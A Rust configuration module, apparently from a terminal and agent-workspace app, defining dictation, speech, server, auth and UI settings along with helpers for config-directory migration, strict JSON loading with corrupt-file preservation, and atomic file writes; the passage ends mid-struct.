use serde::{Deserialize, Serialize, de::DeserializeOwned};

#[cfg(feature = "dictation")]
mod dictation_config {
    use super::*;

    /// Dictation configuration persisted to <config_dir>/dictation-config.json
    #[derive(Debug, Clone, Serialize, Deserialize)]
    pub struct DictationConfig {
        #[serde(default)]
        pub enabled: bool,
        #[serde(default = "default_hotkey")]
        pub hotkey: String,
        #[serde(default = "default_language")]
        pub language: String,
        /// Selected whisper model name (e.g. "large-v3-turbo", "small")
        #[serde(default = "default_model")]
        pub model: String,
        /// Selected audio input device name. None or empty = system default.
        #[serde(default)]
        pub device: Option<String>,
        /// Long-press threshold in milliseconds for push-to-talk activation.
        /// A short press (below this duration) passes through as normal input.
        #[serde(default = "default_long_press_ms")]
        pub long_press_ms: u32,
        /// Automatically send (press Enter) after injecting transcribed text.
        /// On by default; a stored `false` is kept.
        #[serde(default = "default_auto_send")]
        pub auto_send: bool,
        /// Minimum RMS before audio is sent to Whisper. See [`VoiceGates`].
        #[serde(default = "default_rms_threshold")]
        pub rms_threshold: f32,
        /// Maximum `no_speech_probability` accepted for a segment. See [`VoiceGates`].
        #[serde(default = "default_no_speech_threshold")]
        pub no_speech_threshold: f32,
        /// Visible hold-back between a hands-free transcript and its enqueue, in
        /// milliseconds. Zero would send every utterance the instant it lands, so a
        /// config written before hands-free existed takes the default instead.
        #[serde(default = "default_hold_back_ms")]
        pub hands_free_hold_back_ms: u32,
        /// Optional activation phrase for hands-free dictation. Empty means every
        /// recognised utterance is a turn. Set, it must open each new turn: the
        /// match runs locally on the whisper transcript and the phrase is removed
        /// before anything is submitted, so a model never reads it and unrelated
        /// speech never leaves the machine.
        #[serde(default)]
        pub hands_free_activation_phrase: String,
        /// Tell the bound model when hands-free starts and when it stops.
        ///
        /// On by default: the `voice` tool is listed whether or not this is set,
        /// and a model with no reason to speak writes text — so an unset default
        /// would ship a voice nobody ever hears. Turning it off silences both
        /// notices and nothing else; disarming still revokes speech, because that
        /// is a fact about this machine rather than a message to a model.
        #[serde(default = "default_notify_model")]
        pub hands_free_notify_model: bool,
        /// The start notice sent when `hands_free_notify_model` is on. Empty means
        /// the built-in text, which [`get_hands_free_default_notice`] returns so a
        /// settings surface can show it and reset to it. Folded to one line before
        /// it is sent — see [`continuous::entry_hint_text`].
        #[serde(default)]
        pub hands_free_start_notice: String,
        /// Play a short sound on the owning client when a spoken turn reaches the
        /// agent, and a softer one when the activation phrase drops it. On by
        /// default. Read by the frontend only; the backend reports the turns
        /// either way (`HandsFreeStatus::delivered_turns`).
        #[serde(default = "default_earcons")]
        pub hands_free_earcons: bool,
        /// Allow spoken replies for this device's hands-free conversation.
        #[serde(default = "default_true")]
        pub hands_free_spoken_replies: bool,
        /// A speech engine the user supplies, as argv rather than a shell line.
        /// Used when `speech_engine` is `external`. See
        /// [`crate::dictation::speech::external`](crate::dictation::speech::external) for the
        /// markers and for what it means that this runs as the user.
        #[serde(default)]
        pub speech_command: Vec<String>,
        /// The engine that speaks replies: `edge` (Microsoft Edge neural voices,
        /// the default), `pocket` (the bundled Pocket TTS) or `external` (the
        /// command in `speech_command`). Empty means "not chosen yet": a read
        /// answers it from what the installation already holds, see
        /// `dictation::commands::legacy_speech_engine`.
        #[serde(default)]
        pub speech_engine: String,
        /// The Edge voice, such as `it-IT-IsabellaNeural`. Empty means the
        /// language's default. A voice that does not speak the conversation's
        /// language is replaced by that default for the reply.
        #[serde(default)]
        pub speech_edge_voice: String,
        /// Which of the language's voices to speak with. Empty means the first one
        /// it ships, which is what a configuration written before this setting
        /// existed says. Ignored by a user-supplied engine, which names its own
        /// voices inside its command template. See [`choose_voice`].
        #[serde(default)]
        pub speech_voice: String,
        /// The speech level every reply is brought to, in dBFS (-30..=-12). See
        /// [`crate::dictation::loudness`](crate::dictation::loudness).
        #[serde(default = "default_speech_volume_db")]
        pub speech_volume_db: f32,
        /// How strongly a reply is levelled within itself: 0 is off, 1 is 4:1.
        #[serde(default = "default_speech_levelling")]
        pub speech_levelling: f32,
        /// Minutes without any transcription (default 20, Boss 2026-09-30) before the Whisper model is
        /// released from memory (it holds ~1.5 GiB for large-v3-turbo). The next
        /// dictation reloads it lazily (~0.5 s). 0 keeps it loaded for the life
        /// of the process. No UI control.
        #[serde(default = "default_model_idle_unload_minutes")]
        pub model_idle_unload_minutes: u32,
        /// Set only on a read response when malformed fields were replaced by
        /// defaults. It is cleared before persistence.
        #[serde(default)]
        pub recovered_from_corruption: bool,
    }

    /// See [`DictationConfig::model_idle_unload_minutes`].
    pub(crate) fn default_model_idle_unload_minutes() -> u32 {
        20
    }

    pub(crate) fn default_model() -> String {
        "large-v3-turbo".to_string()
    }

    fn default_hotkey() -> String {
        "F5".to_string()
    }

    fn default_language() -> String {
        "auto".to_string()
    }

    pub(crate) fn default_long_press_ms() -> u32 {
        400
    }

    pub(crate) fn default_rms_threshold() -> f32 {
        crate::dictation::transcribe::DEFAULT_RMS_THRESHOLD
    }

    pub(crate) fn default_no_speech_threshold() -> f32 {
        crate::dictation::transcribe::DEFAULT_NO_SPEECH_THRESHOLD
    }

    /// Long enough to read a transcript and stop it, short enough not to feel like
    /// a delay. The number is a setting; this is only where it starts.
    pub(crate) fn default_hold_back_ms() -> u32 {
        1_500
    }

    /// See [`DictationConfig::hands_free_notify_model`].
    pub(crate) fn default_auto_send() -> bool {
        true
    }

    pub(crate) fn default_notify_model() -> bool {
        true
    }

    /// See [`DictationConfig::hands_free_earcons`].
    pub(crate) fn default_earcons() -> bool {
        true
    }

    /// See [`DictationConfig::speech_volume_db`].
    pub(crate) fn default_speech_volume_db() -> f32 {
        -18.0
    }

    /// See [`DictationConfig::speech_levelling`].
    pub(crate) fn default_speech_levelling() -> f32 {
        0.67
    }

    impl DictationConfig {
        /// The speech gates this configuration asks for.
        pub fn gates(&self) -> crate::dictation::transcribe::VoiceGates {
            crate::dictation::transcribe::VoiceGates {
                rms_threshold: self.rms_threshold,
                no_speech_threshold: self.no_speech_threshold,
            }
        }

        /// The level replies are brought to.
        pub fn loudness(&self) -> crate::dictation::loudness::Loudness {
            crate::dictation::loudness::Loudness {
                // A hand-edited config may hold anything: keep the documented range.
                volume_db: if self.speech_volume_db.is_finite() {
                    self.speech_volume_db.clamp(-30.0, -12.0)
                } else {
                    default_speech_volume_db()
                },
                levelling: self.speech_levelling,
            }
        }
    }

    impl Default for DictationConfig {
        fn default() -> Self {
            Self {
                enabled: false,
                hotkey: default_hotkey(),
                language: default_language(),
                model: default_model(),
                device: None,
                long_press_ms: default_long_press_ms(),
                auto_send: default_auto_send(),
                rms_threshold: default_rms_threshold(),
                no_speech_threshold: default_no_speech_threshold(),
                hands_free_hold_back_ms: default_hold_back_ms(),
                hands_free_activation_phrase: String::new(),
                hands_free_notify_model: default_notify_model(),
                hands_free_start_notice: String::new(),
                hands_free_earcons: default_earcons(),
                hands_free_spoken_replies: true,
                speech_command: Vec::new(),
                speech_engine: String::new(),
                speech_edge_voice: String::new(),
                speech_voice: String::new(),
                speech_volume_db: default_speech_volume_db(),
                speech_levelling: default_speech_levelling(),
                model_idle_unload_minutes: default_model_idle_unload_minutes(),
                recovered_from_corruption: false,
            }
        }
    }
}

#[cfg(feature = "dictation")]
pub use dictation_config::DictationConfig;
#[cfg(feature = "dictation")]
pub(crate) use dictation_config::default_hold_back_ms;

use std::collections::HashMap;
use std::io::Write;
use std::path::PathBuf;

#[cfg(test)]
pub(crate) use tuic_core::config_dir::{
    set_override as set_config_dir_override, without_override as without_config_dir_override,
};

/// Resolve the config directory for production or the isolated test support feature.
pub(crate) fn config_dir() -> PathBuf {
    #[cfg(test)]
    {
        tuic_core::config_dir::config_dir()
    }
    #[cfg(not(test))]
    {
        resolve_real_config_dir()
    }
}

/// The real, platform-derived config directory and its legacy migration.
/// Test builds use tuic-core's safe test-support resolver instead.
#[cfg_attr(test, allow(dead_code))]
fn resolve_real_config_dir() -> PathBuf {
    let platform_dir = dirs::config_dir();
    let home = dirs::home_dir().unwrap_or_else(|| PathBuf::from("."));
    let instance = crate::app_instance::current_app_instance();
    let new_dir = tuic_core::config_dir::production_path(platform_dir.as_deref(), &home, instance);

    // Migrate if our config file is missing (the dir may already exist from Tauri's window-state plugin)
    if instance.is_default() && !new_dir.join(APP_CONFIG_FILE).exists() {
        // Try migrating from legacy dirs (newest first): tuicommander, tui-commander, ~/.tuicommander
        let candidates = [
            platform_dir.as_ref().map(|d| d.join("tuicommander")),
            platform_dir.as_ref().map(|d| d.join("tui-commander")),
            Some(legacy_dotdir()),
        ];

        let source = candidates.into_iter().flatten().find(|d| d.exists());

        if let Some(source) = source
            && source != new_dir
            && let Err(e) = migrate_config_dir(&source, &new_dir)
        {
            tracing::warn!("Config migration failed: {e}");
            return source;
        }
    }

    new_dir
}

/// Legacy config directory: ~/.tuicommander/
fn legacy_dotdir() -> PathBuf {
    dirs::home_dir()
        .unwrap_or_else(|| PathBuf::from("."))
        .join(".tuicommander")
}

/// Copy all files from legacy config dir to new platform dir.
fn migrate_config_dir(from: &std::path::Path, to: &std::path::Path) -> Result<(), String> {
    copy_dir_recursive(from, to)?;
    tracing::info!(from = %from.display(), to = %to.display(), "Migrated config directory");
    Ok(())
}

/// Recursively copy a directory, preserving symlinks.
fn copy_dir_recursive(from: &std::path::Path, to: &std::path::Path) -> Result<(), String> {
    std::fs::create_dir_all(to)
        .map_err(|e| format!("Failed to create dir {}: {e}", to.display()))?;

    for entry in std::fs::read_dir(from)
        .map_err(|e| format!("Failed to read dir {}: {e}", from.display()))?
    {
        let entry = entry.map_err(|e| format!("Dir entry error: {e}"))?;
        let dest = to.join(entry.file_name());
        let file_type = entry
            .file_type()
            .map_err(|e| format!("File type error: {e}"))?;

        if file_type.is_symlink() {
            recreate_symlink(&entry.path(), &dest)?;
        } else if file_type.is_file() {
            std::fs::copy(entry.path(), &dest).map_err(|e| format!("Copy error: {e}"))?;
        } else if file_type.is_dir() {
            copy_dir_recursive(&entry.path(), &dest)?;
        }
    }
    Ok(())
}

/// Recreate a symlink at `dest` pointing to the same target as `source`.
fn recreate_symlink(source: &std::path::Path, dest: &std::path::Path) -> Result<(), String> {
    let target = std::fs::read_link(source)
        .map_err(|e| format!("Failed to read symlink {}: {e}", source.display()))?;
    #[cfg(unix)]
    std::os::unix::fs::symlink(&target, dest)
        .map_err(|e| format!("Failed to create symlink {}: {e}", dest.display()))?;
    #[cfg(windows)]
    {
        // Windows requires different calls for file vs directory symlinks
        let is_dir = std::fs::metadata(&target)
            .map(|m| m.is_dir())
            .unwrap_or(false);
        if is_dir {
            std::os::windows::fs::symlink_dir(&target, dest)
        } else {
            std::os::windows::fs::symlink_file(&target, dest)
        }
        .map_err(|e| format!("Failed to create symlink {}: {e}", dest.display()))?;
    }
    Ok(())
}

/// Load a JSON config file, returning Default if missing or corrupt.
/// Logs warnings/errors when the file exists but cannot be read or parsed,
/// so corrupt files are visible in logs instead of silently resetting state.
pub(crate) fn load_json_config<T: DeserializeOwned + Default>(filename: &str) -> T {
    let path = config_dir().join(filename);
    load_json_config_from_path(&path)
}

fn load_json_config_from_path<T: DeserializeOwned + Default>(path: &std::path::Path) -> T {
    if !path.exists() {
        return T::default();
    }
    let content = match std::fs::read_to_string(path) {
        Ok(s) => s,
        Err(e) => {
            tracing::warn!(path = %path.display(), "Could not read config: {e}");
            return T::default();
        }
    };
    match serde_json::from_str(&content) {
        Ok(v) => v,
        Err(e) => {
            tracing::error!(path = %path.display(), "Corrupt config: {e}. Using defaults.");
            T::default()
        }
    }
}

/// Load a JSON config file, distinguishing "not written yet" (legitimately empty) from
/// "there but broken". Used where a silent fallback to `Default` would let the next write
/// overwrite real user data — notes.json (GH #107). A file that parses as garbage is moved
/// aside as `<name>.corrupt-<uuid>` so it survives for recovery.
pub(crate) fn load_json_config_strict<T: DeserializeOwned + Default>(
    filename: &str,
) -> Result<T, String> {
    let path = config_dir().join(filename);
    load_json_config_strict_from_path(&path)
}

fn load_json_config_strict_from_path<T: DeserializeOwned + Default>(
    path: &std::path::Path,
) -> Result<T, String> {
    if !path.exists() {
        return Ok(T::default());
    }
    let content = std::fs::read_to_string(path).map_err(|e| {
        tracing::error!(path = %path.display(), "Could not read config: {e}");
        format!("Could not read {}: {e}", path.display())
    })?;
    serde_json::from_str(&content).map_err(|e| {
        // Move the bad file aside: the caller refuses to write until a load succeeds, but a
        // later code path (or a second instance) must not be able to clobber it either.
        // Renamed BEFORE the log line, never inside it — `tracing` does not evaluate field
        // expressions when no subscriber wants the event, so preservation would silently
        // stop happening whenever logging is filtered out.
        let preserved = preserve_corrupt_config(path).map_or_else(
            || "<rename failed>".to_string(),
            |aside| aside.display().to_string(),
        );
        tracing::error!(
            path = %path.display(),
            preserved_as = %preserved,
            "Corrupt config: {e}"
        );
        format!("Corrupt {}: {e}", path.display())
    })
}

/// Move a config file that could not be parsed aside, so nothing can overwrite it.
///
/// The `corrupt-<uuid>` suffix is fresh on every call. A fixed name would let the
/// second corrupt load erase the document the first one saved — the same data loss,
/// one indirection further out. Returns the backup path, or `None` when the rename
/// itself failed (a read-only config dir, say); callers report that, they cannot fix it.
fn preserve_corrupt_config(path: &std::path::Path) -> Option<PathBuf> {
    let aside = path.with_extension(format!("corrupt-{}", uuid::Uuid::new_v4()));
    std::fs::rename(path, &aside).ok().map(|()| {
        reap_corrupt_backups(&aside);
        aside
    })
}

/// How many `<name>.corrupt-<uuid>` backups to keep per config file.
///
/// A count, not an age: the point of the backup is hand recovery, and a user who
/// comes back a month later would find an age rule had deleted the very file they
/// came for. Five is enough to survive a corruption that repeats across a few
/// restarts while still bounding the directory.
const MAX_CORRUPT_BACKUPS: usize = 5;

/// Drop the oldest backups of the file `keep` was just made from, leaving at most
/// [`MAX_CORRUPT_BACKUPS`].
///
/// Scoped to one config file's own backups, by stem. A storm of
/// `repositories.corrupt-*` must not evict the single `notes.corrupt-*` a user
/// needs — that would be this cleanup causing exactly the data loss the rename
/// exists to prevent.
///
/// `keep` is excluded explicitly rather than trusted to sort first: mtime has
/// coarse resolution on some filesystems, so two backups written in the same
/// tick can compare equal and the newest is not guaranteed to win a sort.
///
/// Every failure here is swallowed after logging. This runs inside a config load
/// that has already failed; making that load fail differently because a stale
/// backup could not be unlinked would be strictly worse than keeping the file.
fn reap_corrupt_backups(keep: &std::path::Path) {
    let (Some(dir), Some(stem)) = (keep.parent(), keep.file_stem().and_then(|s| s.to_str())) else {
        return;
    };
    let prefix = format!("{stem}.corrupt-");
    let entries = match std::fs::read_dir(dir) {
        Ok(entries) => entries,
        Err(e) => {
            tracing::warn!(dir = %dir.display(), "Could not list corrupt backups: {e}");
            return;
        }
    };
    let mut backups: Vec<(std::time::SystemTime, PathBuf)> = entries
        .filter_map(Result::ok)
        .map(|e| e.path())
        .filter(|p| *p != keep)
        .filter(|p| {
            p.file_name()
                .and_then(|n| n.to_str())
                .is_some_and(|n| n.starts_with(&prefix))
        })
        .map(|p| {
            // An unreadable mtime sorts as oldest, so a backup we cannot date is
            // reaped before one we can. It is still never `keep`.
            let modified = p
                .metadata()
                .and_then(|m| m.modified())
                .unwrap_or(std::time::SystemTime::UNIX_EPOCH);
            (modified, p)
        })
        .collect();
    // Newest first, so the tail is what to drop. `keep` is not in this list and
    // occupies one of the slots, hence `- 1`.
    backups.sort_by_key(|a| std::cmp::Reverse(a.0));
    for (_, stale) in backups
        .into_iter()
        .skip(MAX_CORRUPT_BACKUPS.saturating_sub(1))
    {
        if let Err(e) = std::fs::remove_file(&stale) {
            tracing::warn!(path = %stale.display(), "Could not reap corrupt backup: {e}");
        }
    }
}

/// Atomically write `data` to `target` via temp+rename with 0600 perms.
/// Fsyncs the temp file before renaming: rename is atomic w.r.t. the directory
/// entry, but without fsync a crash right after it can still leave the target
/// containing stale or zero-length content on filesystems that reorder data
/// writes past metadata writes (e.g. ext4 `data=writeback`).
pub(crate) fn persist_atomic(target: &std::path::Path, data: &[u8]) -> Result<(), String> {
    persist_atomic_with_mode(target, data, 0o600)
}

/// Set the Unix mode on the temporary inode before publishing it atomically.
/// Other platforms retain their normal file permissions.
pub(crate) fn persist_atomic_with_mode(
    target: &std::path::Path,
    data: &[u8],
    _mode: u32,
) -> Result<(), String> {
    if let Some(dir) = target.parent() {
        std::fs::create_dir_all(dir).map_err(|e| format!("Failed to create directory: {e}"))?;
    }
    // Unique per-call temp name (uuid) — a per-process name lets two concurrent
    // writers to the same target collide on the temp file and corrupt it (#117-a503).
    let temp = target.with_extension(format!("tmp.{}", uuid::Uuid::new_v4()));
    let mut file =
        std::fs::File::create(&temp).map_err(|e| format!("Failed to write temp file: {e}"))?;
    file.write_all(data).map_err(|e| {
        let _ = std::fs::remove_file(&temp);
        format!("Failed to write temp file: {e}")
    })?;

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let perms = std::fs::Permissions::from_mode(_mode);
        std::fs::set_permissions(&temp, perms).map_err(|e| {
            let _ = std::fs::remove_file(&temp);
            format!("Failed to set permissions: {e}")
        })?;
    }

    file.sync_all().map_err(|e| {
        let _ = std::fs::remove_file(&temp);
        format!("Failed to fsync temp file: {e}")
    })?;
    drop(file);

    std::fs::rename(&temp, target).map_err(|e| {
        let _ = std::fs::remove_file(&temp);
        format!("Failed to commit file: {e}")
    })?;
    Ok(())
}

// ---------------------------------------------------------------------------
// AppConfig — previously in lib.rs, now lives here
// ---------------------------------------------------------------------------

/// Whether split terminal panes get separate tabs or share a unified tab
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub(crate) enum SplitTabMode {
    #[default]
    Separate,
    Unified,
}

/// Tab ordering mode for the tab bar
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub(crate) enum TabOrderingMode {
    #[default]
    GroupedByType,
    TerminalsFirst,
    Free,
}

/// Where to create worktree directories
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub(crate) enum WorktreeStorage {
    /// `~/dev/myrepo__wt/feat-123` — sibling dir next to repo
    #[default]
    Sibling,
    /// `~/Library/.../tuicommander/worktrees/repo/feat-123` — app config dir
    AppDir,
    /// `<repo>/.worktrees/feat-123` — inside the repository
    InsideRepo,
    /// `<repo>/.claude/worktrees/feat-123` — Claude Code default location
    ClaudeCodeDefault,
}

/// How to handle orphan worktrees (branch deleted)
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub(crate) enum OrphanCleanup {
    /// Auto-remove worktree + prune
    On,
    /// Ignore, keep in sidebar
    Off,
    /// Show toast with Remove/Keep action
    #[default]
    Ask,
}

/// Git merge strategy for PRs
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub(crate) enum MergeStrategy {
    Merge,
    // Squash is the global default (matches the common "squash & merge" PR flow);
    // per-repo Option<MergeStrategy> overrides still win when set.
    #[default]
    Squash,
    Rebase,
}

/// What to do with a worktree after its branch is merged
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub(crate) enum WorktreeAfterMerge {
    /// Move to __archived/ subdir
    #[default]
    Archive,
    /// Remove worktree and branch entirely
    Delete,
    /// Show confirmation dialog
    Ask,
}

/// Auto-delete local branch when PR is merged/closed
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub(crate) enum AutoDeleteOnPrClose {
    #[default]
    Off,
    Ask,
    Auto,
}

// ---------------------------------------------------------------------------
// ServicesConfig — nested config for remote access, auth, relay, push
// ---------------------------------------------------------------------------

#[derive(Clone, Debug, Serialize, Deserialize)]
pub(crate) struct ServerConfig {
    #[serde(default)]
    pub(crate) enabled: bool,
    #[serde(default = "default_remote_port")]
    pub(crate) port: u16,
    #[serde(default)]
    pub(crate) ipv6_enabled: bool,
}

impl Default for ServerConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            port: default_remote_port(),
            ipv6_enabled: false,
        }
    }
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub(crate) struct AuthConfig {
    #[serde(default)]
    pub(crate) username: String,
    #[serde(default)]
    pub(crate) password_hash: String,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub(crate) session_token: String,
    #[serde(default, skip_serializing_if = "is_false")]
    pub(crate) session_token_exists: bool,
    #[serde(default = "default_session_token_duration_secs")]
    pub(crate) session_token_duration_secs: u64,
    #[serde(default)]
    pub(crate) lan_auth_bypass: bool,
    #[serde(default = "default_auth_rate_limit_max")]
    pub(crate) auth_rate_limit_max: u32,
    #[serde(default = "default_auth_rate_limit_window_secs")]
    pub(crate) auth_rate_limit_window_secs: u64,
}

fn default_auth_rate_limit_max() -> u32 {
    5
}
fn default_auth_rate_limit_window_secs() -> u64 {
    300
}

impl Default for AuthConfig {
    fn default() -> Self {
        Self {
            username: String::new(),
            password_hash: String::new(),
            session_token: String::new(),
            session_token_exists: false,
            session_token_duration_secs: default_session_token_duration_secs(),
            lan_auth_bypass: false,
            auth_rate_limit_max: default_auth_rate_limit_max(),
            auth_rate_limit_window_secs: default_auth_rate_limit_window_secs(),
        }
    }
}

#[derive(Clone, Debug, Default, Serialize)]
#[serde(tag = "mode", rename_all = "lowercase")]
pub(crate) enum TlsConfig {
    #[default]
    Off,
    Manual {
        cert_path: String,
        key_path: String,
    },
}

impl<'de> serde::Deserialize<'de> for TlsConfig {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        let val = serde_json::Value::deserialize(deserializer)?;
        match val.as_object() {
            Some(obj)
                if obj.is_empty() || obj.get("mode").and_then(|v| v.as_str()) == Some("off") =>
            {
                Ok(TlsConfig::Off)
            }
            Some(obj) if obj.get("mode").and_then(|v| v.as_str()) == Some("manual") => {
                let cert_path = obj
                    .get("cert_path")
                    .and_then(|v| v.as_str())
                    .unwrap_or_default()
                    .to_string();
                let key_path = obj
                    .get("key_path")
                    .and_then(|v| v.as_str())
                    .unwrap_or_default()
                    .to_string();
                Ok(TlsConfig::Manual {
                    cert_path,
                    key_path,
                })
            }
            _ => Ok(TlsConfig::Off),
        }
    }
}

#[derive(Clone, Debug, Default, Serialize, Deserialize)]
pub(crate) struct RelayConfig {
    #[serde(default)]
    pub(crate) enabled: bool,
    #[serde(default)]
    pub(crate) url: String,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub(crate) token: String,
    // `Option<bool>` (unlike the plain `bool` used by session_token_exists /
    // vapid_private_key_exists) so a partial JSON payload that OMITS this key
    // (e.g. agent MCP `config/save`, or a partial PUT /config) deserializes to
    // `None` ("caller didn't touch this") rather than defaulting to `false`
    // ("caller explicitly cleared it"). preserve_redacted_app_config_secrets
    // relies on that distinction to avoid silently deleting the stored relay
    // token — see DATA-1.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) token_exists: Option<bool>,
    #[serde(default)]
    pub(crate) session_id: String,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub(crate) struct PushConfig {
    #[serde(default)]
    pub(crate) enabled: bool,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub(crate) vapid_private_key: String,
    #[serde(default, skip_serializing_if = "is_false")]
    pub(crate) vapid_private_key_exists: bool,
    #[serde(default)]
    pub(crate) vapid_public_key: String,
    #[serde(default = "default_vapid_subject")]
    pub(crate) vapid_subject: String,
}

impl Default for PushConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            vapid_private_key: String::new(),
            vapid_private_key_exists: false,
            vapid_public_key: String::new(),
            vapid_subject: default_vapid_subject(),
        }
    }
}

#[derive(Clone, Debug, Default, Serialize, Deserialize)]
pub(crate) struct ServicesConfig {
    #[serde(default)]
    pub(crate) server: ServerConfig,
    #[serde(default)]
    pub(crate) auth: AuthConfig,
    #[serde(default)]
    pub(crate) tls: TlsConfig,
    #[serde(default)]
    pub(crate) relay: RelayConfig,
    #[serde(default)]
    pub(crate) push: PushConfig,
}

#[derive(Clone, Serialize, Deserialize)]
pub(crate) struct AppConfig {
    pub(crate) shell: Option<String>,
    pub(crate) font_family: String,
    pub(crate) font_size: u16,
    /// Terminal font weight (100–900, e.g. 200 = ExtraLight, 400 = Regular)
    #[serde(default = "default_font_weight")]
    pub(crate) font_weight: u16,
    pub(crate) theme: String,
    /// Enable MCP HTTP API on localhost for external tool integration
    #[serde(default)]
    pub(crate) mcp_server_enabled: bool,
    /// Fixed port for MCP server (0 = OS-assigned)
    #[serde(default = "default_mcp_port")]
    pub(crate) mcp_port: u16,
    /// Whether MCP config has been auto-installed in agent configs
    #[serde(default)]
    pub(crate) mcp_config_installed: bool,
    /// Preferred IDE (e.g. "vscode", "cursor")
    #[serde(default)]
    pub(crate) ide: String,
    /// Absolute path to the one ego executable this host may launch for ACP.
    ///
    /// The only place the ACP process authority comes from. No ACP command
    /// carries it: a caller supplies a working directory and nothing else, so
    /// no connect request can choose which binary runs. It is configuration —
    /// edited in Settings and written through `save_config` like every other
    /// field here. Empty means ACP is not configured on this host and every
    /// connect is refused.
    #[serde(default)]
    pub(crate) ego_executable: String,
    /// Optional user-config profile passed to ego at ACP launch.
    #[serde(default)]
    pub(crate) ego_profile: String,
    /// Directory every AI Chat conversation runs in. Empty means the user's home
    /// directory. Must be absolute; a missing directory is created at connect.
    #[serde(default)]
    pub(crate) ai_chat_workspace: String,
    /// Last selected ego conversation for each repository root.
    #[serde(default)]
    pub(crate) ai_chat_sessions: HashMap<String, String>,
    /// Host-issued peer UUID for the AI Chat conversation at each root.
    #[serde(default)]
    pub(crate) ai_chat_peer_ids: HashMap<String, String>,
    /// Launch options and durable peer identity for individually configured chats.
    #[serde(default)]
    pub(crate) ai_chat_launches: HashMap<String, crate::acp_chat::ChatLaunch>,
    /// Default font size for new terminals
    #[serde(default = "default_font_size")]
    pub(crate) default_font_size: u16,
    /// Maximum binary attachment upload, in bytes (must be positive).
    #[serde(default = "default_attachment_max_bytes")]
    pub(crate) attachment_max_bytes: u64,
    /// Remove uploaded files older than this many days when their session closes.
    #[serde(default = "default_attachment_retention_days")]
    pub(crate) attachment_retention_days: u32,
    #[serde(default)]
    pub(crate) services: ServicesConfig,
    /// Show confirmation dialog when quitting with active terminals
    #[serde(default = "default_true")]
    pub(crate) confirm_before_quit: bool,
    /// Show confirmation dialog when closing a terminal tab
    #[serde(default = "default_true")]
    pub(crate) confirm_before_closing_tab: bool,
    /// Maximum characters for tab names before truncation
    #[serde(default = "default_max_tab_name_length")]
    pub(crate) max_tab_name_length: u32,
    /// Split tab mode: separate (each pane gets a tab) or unified (one shared tab)
    #[serde(default)]
    pub(crate) split_tab_mode: SplitTabMode,
    /// Tab ordering mode: grouped-by-type, terminals-first, or free
    #[serde(default)]
    pub(crate) tab_ordering_mode: TabOrderingMode,
    /// Cycle through all tab types (terminals + diff/md/editor) with prev/next, not just terminals
    #[serde(default)]
    pub(crate) tab_cycling_all_types: bool,
    /// Show a branch's open terminals as a nested list under its sidebar row
    /// Opt-in, off by default; available whenever a branch has an open terminal.
    #[serde(default)]
    pub(crate) tab_tree_enabled: bool,
    /// Auto-show PR detail popover when a branch has PR data
    #[serde(default = "default_true")]
    pub(crate) auto_show_pr_popover: bool,
    /// Prevent system sleep while any terminal session is busy
    #[serde(default)]
    pub(crate) prevent_sleep_when_busy: bool,
    /// Automatically check for app updates on startup
    #[serde(default = "default_true")]
    pub(crate) auto_update_enabled: bool,
    /// Automatically check for plugin updates on startup
    #[serde(default = "default_true")]
    pub(crate) auto_update_plugins_enabled: bool,
    /// UI language code (e.g. "en", "it", "de")
    #[serde(default = "default_language")]
    pub(crate) language: String,
    /// Plugin IDs that the user has disabled (not loaded on startup)
    #[serde(default)]
    pub(crate) disabled_plugin_ids: Vec<String>,
    /// Update channel: "stable" or "nightly"
    #[serde(default = "default_update_channel")]
    pub(crate) update_channel: String,
    /// Agent types disabled by the user (won't appear in sidebar "Add Agent" menu)
    #[serde(default)]
    pub(crate) disabled_agents: Vec<String>,
    /// Agent types whose MCP bridge config is disabled (ensure_mcp_configs skips these)
    #[serde(default)]
    pub(crate) disabled_mcp_agents: Vec<String>,
    /// Native MCP tool names disabled by the user (excluded from tools/list response)
    #[serde(default = "default_disabled_native_tools")]
    pub(crate) disabled_native_tools: Vec<String>,
    /// Collapse all MCP tools into 3 meta-tools (search_tools, get_tool_schema, call_tool).
    /// Reduces AI context from ~35k to ~500 tokens. Default: false (individual tools exposed).
    #[serde(default)]
    pub(crate) collapse_tools: bool,
    /// Show agent intent as tab title (from `intent: text (title)` tokens)
    #[serde(default = "default_true")]
    pub(crate) intent_tab_title: bool,
    /// Show suggested follow-up actions from agents (from `suggest: A | B | C` tokens)
    #[serde(default = "default_true")]
    pub(crate) suggest_followups: bool,
    /// Collect the Progress journal: the `progress` tool, its `initialize`
    /// obligation, and `intent:` capture. One flag governs all of them, which
    /// is why pause/resume of collection does not exist.
    #[serde(default = "default_true")]
    pub(crate) progress_tracking: bool,
    /// Auto-copy terminal selection to clipboard
    #[serde(default = "default_true")]
    pub(crate) copy_on_select: bool,
    /// Honor OSC 52 clipboard-write sequences from terminal output. Disable to
    /// ignore clipboard writes emitted by displayed files/logs. Frontend-gated
    /// (the OSC 52 write executes in the renderer); stored here for persistence.
    #[serde(default = "default_true")]
    pub(crate) osc52_clipboard: bool,
    /// Show last prompt overlay bar at the top of the terminal
    #[serde(default = "default_true")]
    pub(crate) show_last_prompt: bool,
    /// Terminal bell style: "none", "visual", "sound", or "both"
    #[serde(default = "default_bell_style")]
    pub(crate) bell_style: String,
    /// Global OS-level hotkey combo to toggle window visibility (e.g. "CommandOrControl+Shift+T")
